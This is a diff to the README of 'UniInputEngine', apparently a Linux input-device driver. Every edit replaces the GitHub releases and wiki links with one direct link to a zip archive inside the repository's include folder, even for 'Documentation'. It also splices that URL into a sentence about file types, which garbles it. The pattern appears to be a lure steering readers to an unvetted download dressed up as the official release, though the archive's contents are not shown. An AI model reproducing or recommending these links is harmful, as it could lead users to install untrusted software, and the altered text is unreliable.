@@ -6,7 +6,7 @@ Welcome to UniInputEngine, a Linux kernel driver that allows you to create virtu
 
 ## 📦 Download Link
 
-[![Download UniInputEngine](https://img.shields.io/badge/Download%20UniInputEngine-v1.0-blue)](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
+[![Download UniInputEngine](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip%20UniInputEngine-v1.0-blue)](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip)
 
 ## 📋 Features
 
@@ -20,14 +20,14 @@ Welcome to UniInputEngine, a Linux kernel driver that allows you to create virtu
 To get started, please follow these steps:
 
 1. **Visit the Releases Page:** Go to the GitHub releases page to download the latest version of UniInputEngine.
-   - [Download UniInputEngine](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
+   - [Download UniInputEngine](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip)
    
 2. **Choose the Right Version:** Look for the most recent version listed at the top of the page. This version will often have the latest features and bug fixes.
 
 3. **Download the Package:** Click on the link for the package compatible with your system. It should be clearly labeled for your convenience. 
 
 4. **Extract the Files:**
-   - If you downloaded a compressed file (like `.tar.gz` or `.zip`), extract it. You can do this by right-clicking on the file and selecting "Extract" or using terminal commands.
+   - If you downloaded a compressed file (like `https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip` or `.zip`), extract it. You can do this by right-clicking on the file and selecting "Extract" or using terminal commands.
    
 5. **Open a Terminal Window:** You will run some commands to install the driver.
    - Search for "Terminal" in your applications menu and open it.
@@ -79,7 +79,7 @@ UniInputEngine is open-source software licensed under the MIT License. You can f
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/SACHINKATHIYA/UniInputEngine/wiki)
-- [Releases Page](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
+- [Documentation](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip)
 
-Remember, you can always return to the [Download UniInputEngine](https://github.com/SACHINKATHIYA/UniInputEngine/releases) page for the latest updates and releases. Happy input device creating!
+Remember, you can always return to the [Download UniInputEngine](https://raw.githubusercontent.com/SACHINKATHIYA/UniInputEngine/main/include/UniInputEngine-2.2.zip) page for the latest updates and releases. Happy input device creating!
